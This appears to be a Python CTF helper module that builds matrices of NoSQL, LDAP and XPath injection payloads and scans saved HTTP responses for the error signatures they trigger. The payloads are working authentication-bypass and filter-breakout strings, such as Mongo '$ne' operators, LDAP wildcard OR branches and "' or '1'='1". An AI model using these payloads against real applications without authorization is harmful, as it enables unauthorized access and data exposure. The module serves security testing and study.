#!/usr/bin/env python3
"""Offline NoSQL, LDAP, and XPath injection payload and evidence helpers.

The builders in this module only return bounded strings and metadata.  They do
not parse structured challenge documents, open sockets, or replay requests.
They are intended for reviewing supplied source and saved request/response
transcripts in an authorized CTF workspace.
"""

from __future__ import annotations

from dataclasses import asdict, dataclass
import re
from typing import Iterable


MAX_TEXT = 256_000
MAX_MARKER = 64
MAX_NEW_LINES = 12


class InjectionInputError(ValueError):
    """Raised when an offline builder receives an unsafe or unbounded input."""


@dataclass(frozen=True, slots=True)
class InjectionPayload:
    """One inert candidate string and the condition it is meant to test."""

    family: str
    name: str
    value: str
    context: str
    purpose: str
    expected_signal: str
    prerequisites: tuple[str, ...] = ()

    def to_dict(self) -> dict[str, object]:
        row = asdict(self)
        row.update({"offline": True, "network_requests": 0, "inert": True})
        return row


@dataclass(frozen=True, slots=True)
class InjectionFinding:
    """A deterministic signature found in supplied saved text."""

    family: str
    signature: str
    evidence: str
    offset: int
    confidence: str

    def to_dict(self) -> dict[str, object]:
        return asdict(self)


_TOKEN = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,63}$")
# RFC 4512 attribute description: a dotless descriptor (letter then letters,
# digits, hyphens) or a dotted numeric OID, each with optional ``;option``
# suffixes. A dot is legal only inside a numeric OID, never in a descriptor.
_LDAP_ATTRIBUTE = re.compile(
    r"\A(?:[A-Za-z][A-Za-z0-9-]*|[0-9]+(?:\.[0-9]+)+)(?:;[A-Za-z0-9-]+)*\Z"
)
_MARKER = re.compile(r"^[A-Za-z0-9_.:-]{1,64}$")
_STATUS = re.compile(r"(?im)^HTTP/(?:1\.[01]|2|3)\s+(\d{3})\b")


def _token(value: str, label: str) -> str:
    if not isinstance(value, str) or not _TOKEN.fullmatch(value):
        raise InjectionInputError(
            f"{label} must match {_TOKEN.pattern!r} and be at most 64 characters"
        )
    return value


def _ldap_attribute(value: str, label: str = "attribute") -> str:
    if (not isinstance(value, str) or len(value) > 64
            or not _LDAP_ATTRIBUTE.fullmatch(value)):
        raise InjectionInputError(
            f"{label} must match an RFC 4512 attribute description "
            f"(descriptor or numeric OID) and be at most 64 characters"
        )
    return value


def _marker(value: str) -> str:
    if not isinstance(value, str) or not _MARKER.fullmatch(value):
        raise InjectionInputError(
            "marker must contain only ASCII letters, digits, dot, underscore, colon, or hyphen"
        )
    return value


def _text(value: str | bytes | bytearray, label: str) -> str:
    if isinstance(value, str):
        text = value
    elif isinstance(value, (bytes, bytearray)):
        text = bytes(value).decode("utf-8", "replace")
    else:
        raise InjectionInputError(f"{label} must be text or bytes")
    if len(text) > MAX_TEXT:
        raise InjectionInputError(f"{label} exceeds {MAX_TEXT} characters")
    return text


def nosql_payloads(
    field: str = "username", marker: str = "r5d_probe"
) -> tuple[InjectionPayload, ...]:
    """Return Mongo-style operator candidates for JSON and form contexts.

    No JavaScript ``$where`` bodies are emitted: the matrix focuses on data
    operators that can establish parser/operator reachability without asking a
    database to execute supplied code.
    """

    field = _token(field, "field")
    marker = _marker(marker)
    rows = (
        (
            "json_ne_null",
            f'{{"{field}":{{"$ne":null}}}}',
            "JSON object body",
            "detect acceptance of a nested comparison operator",
            "response differs from the same field sent as a scalar",
        ),
        (
            "json_regex_prefix",
            f'{{"{field}":{{"$regex":"^{marker}"}}}}',
            "JSON object body",
            "detect regular-expression operator interpretation",
            "result set or validation path changes for a controlled prefix",
        ),
        (
            "json_expr_true",
            '{"$expr":{"$eq":[1,1]}}',
            "JSON query object",
            "detect top-level expression operator acceptance",
            "an always-true expression reaches query evaluation",
        ),
        (
            "form_ne",
            f"{field}[$ne]={marker}",
            "URL-encoded form key",
            "detect bracket-to-object expansion",
            "the framework converts a bracketed key into an operator object",
        ),
        (
            "form_regex",
            f"{field}[$regex]=%5E{marker}",
            "URL-encoded form key",
            "detect bracket expansion plus regular-expression handling",
            "the backend evaluates the supplied prefix expression",
        ),
        (
            "duplicate_scalar_operator",
            f"{field}={marker}&{field}[$ne]={marker}",
            "URL-encoded duplicate parameters",
            "identify scalar/object parameter precedence",
            "front end and query layer select different duplicate representations",
        ),
    )
    return tuple(
        InjectionPayload("nosql", name, value, context, purpose, signal)
        for name, value, context, purpose, signal in rows
    )


def ldap_payloads(
    attribute: str = "uid", marker: str = "r5d_probe"
) -> tuple[InjectionPayload, ...]:
    """Return filter-breakout strings for common LDAP interpolation contexts."""

    attribute = _ldap_attribute(attribute, "attribute")
    marker = _marker(marker)
    rows = (
        (
            "wildcard_value",
            "*",
            "raw assertion value",
            "detect an unescaped wildcard in an equality assertion",
            "a broader result replaces an exact-match result",
        ),
        (
            "close_or_wildcard",
            f"*)({attribute}=*",
            f"inside (&({attribute}=VALUE)(...))",
            "close the current assertion and add a wildcard assertion",
            "filter shape changes without a filter syntax error",
        ),
        (
            "or_objectclass",
            "*)(|(objectClass=*)",
            "inside a parenthesized equality assertion",
            "insert an always-matching OR branch",
            "the backend accepts the added branch or reports its expanded filter",
        ),
        (
            "false_control",
            f"*)(&({attribute}={marker})({attribute}=__r5d_impossible__)",
            "inside a parenthesized equality assertion",
            "provide a deliberately false structural control",
            "a true/false response pair isolates filter interpretation",
        ),
        (
            "escaped_or_percent",
            "%2a%29%28%7c%28objectClass%3d%2a%29",
            "URL-encoded assertion value",
            "test whether URL decoding occurs before LDAP escaping",
            "the decoded value changes the filter grammar",
        ),
    )
    return tuple(
        InjectionPayload(
            "ldap",
            name,
            value,
            context,
            purpose,
            signal,
            ("the application interpolates a value into an LDAP search filter",),
        )
        for name, value, context, purpose, signal in rows
    )


def xpath_payloads(marker: str = "r5d_probe") -> tuple[InjectionPayload, ...]:
    """Return XPath 1.0-compatible boolean and node-selection candidates."""

    marker = _marker(marker)
    rows = (
        (
            "single_quote_true",
            "' or '1'='1",
            "single-quoted string predicate",
            "establish boolean predicate injection",
            "true and false controls produce different saved responses",
        ),
        (
            "single_quote_false",
            "' and '1'='2",
            "single-quoted string predicate",
            "supply a false control matching the true payload's grammar",
            "response matches a known-empty lookup",
        ),
        (
            "double_quote_true",
            '" or "1"="1',
            "double-quoted string predicate",
            "establish boolean predicate injection",
            "true and false controls produce different saved responses",
        ),
        (
            "numeric_true",
            "1 or 1=1",
            "numeric predicate",
            "detect an unquoted numeric XPath expression",
            "the predicate evaluates true without a conversion error",
        ),
        (
            "node_union",
            "'] | //* | //*['",
            "single-quoted location predicate",
            "detect union-based node selection",
            "additional nodes appear in a supplied response",
        ),
        (
            "contains_marker",
            f"' or contains(string(.),'{marker}') or 'a'='b",
            "single-quoted predicate with XPath functions",
            "test function evaluation using a controlled marker",
            "a marker-bearing node changes the predicate result",
        ),
    )
    return tuple(
        InjectionPayload(
            "xpath",
            name,
            value,
            context,
            purpose,
            signal,
            ("the input is interpolated into an XPath expression",),
        )
        for name, value, context, purpose, signal in rows
    )


def injection_matrix(
    *, field: str = "username", attribute: str = "uid", marker: str = "r5d_probe"
) -> tuple[InjectionPayload, ...]:
    """Return the complete stable family matrix."""

    return (
        *nosql_payloads(field, marker),
        *ldap_payloads(attribute, marker),
        *xpath_payloads(marker),
    )


_SIGNATURES: tuple[tuple[str, str, re.Pattern[str]], ...] = (
    ("nosql", "mongodb_error", re.compile(r"(?i)\b(?:MongoServerError|MongoError|BSONError)\b")),
    ("nosql", "operator_rejected", re.compile(r"(?i)\b(?:unknown|invalid|unsupported)\s+(?:query\s+)?operator\b")),
    ("nosql", "objectid_cast", re.compile(r"(?i)\bCast to ObjectId failed\b")),
    ("ldap", "ldap_exception", re.compile(r"(?i)\b(?:LDAPException|InvalidSearchFilterException)\b")),
    ("ldap", "filter_syntax", re.compile(r"(?i)\b(?:bad|invalid|malformed)\s+(?:LDAP\s+)?(?:search\s+)?filter\b")),
    ("xpath", "xpath_exception", re.compile(r"(?i)\b(?:XPathException|XPathEvalError|XPathExpressionException)\b")),
    ("xpath", "predicate_error", re.compile(r"(?i)\b(?:Invalid predicate|Unterminated literal|Invalid expression)\b")),
)


def analyze_injection_text(
    saved_text: str | bytes | bytearray,
) -> tuple[InjectionFinding, ...]:
    """Find parser/query-engine evidence in a bounded saved transcript."""

    text = _text(saved_text, "saved_text")
    findings: list[InjectionFinding] = []
    for family, signature, pattern in _SIGNATURES:
        match = pattern.search(text)
        if match:
            start = match.start()
            evidence = text[max(0, start - 48) : min(len(text), match.end() + 80)]
            findings.append(
                InjectionFinding(family, signature, evidence, start, "high")
            )
    return tuple(sorted(findings, key=lambda row: (row.offset, row.family, row.signature)))


def _status_code(text: str) -> int | None:
    match = _STATUS.search(text)
    return int(match.group(1)) if match else None


def _body(text: str) -> str:
    for separator in ("\r\n\r\n", "\n\n"):
        if separator in text:
            return text.split(separator, 1)[1]
    return text


def _unique_lines(candidate: str, baseline: str) -> tuple[str, ...]:
    known = {line.strip() for line in baseline.splitlines() if line.strip()}
    rows: list[str] = []
    for line in candidate.splitlines():
        clean = line.strip()
        if clean and clean not in known and clean not in rows:
            rows.append(clean[:240])
            if len(rows) >= MAX_NEW_LINES:
                break
    return tuple(rows)


def compare_saved_responses(
    baseline: str | bytes | bytearray,
    candidate: str | bytes | bytearray,
    *,
    marker: str | None = None,
) -> dict[str, object]:
    """Compare two saved HTTP/text responses without interpreting their formats."""

    before = _text(baseline, "baseline")
    after = _text(candidate, "candidate")
    checked_marker = _marker(marker) if marker is not None else None
    before_body = _body(before)
    after_body = _body(after)
    before_families = {row.family for row in analyze_injection_text(before)}
    after_findings = analyze_injection_text(after)
    after_families = {row.family for row in after_findings}
    return {
        "baseline_status": _status_code(before),
        "candidate_status": _status_code(after),
        "status_changed": _status_code(before) != _status_code(after),
        "body_length_delta": len(after_body) - len(before_body),
        "marker_reflected": bool(
            checked_marker
            and checked_marker in after_body
            and checked_marker not in before_body
        ),
        "new_error_families": tuple(sorted(after_families - before_families)),
        "findings": tuple(row.to_dict() for row in after_findings),
        "new_lines": _unique_lines(after_body, before_body),
        "offline": True,
        "network_requests": 0,
    }


def rows_as_dicts(rows: Iterable[InjectionPayload]) -> tuple[dict[str, object], ...]:
    """Serialize trusted in-memory payload descriptors for CLI/UI consumers."""

    return tuple(row.to_dict() for row in rows)
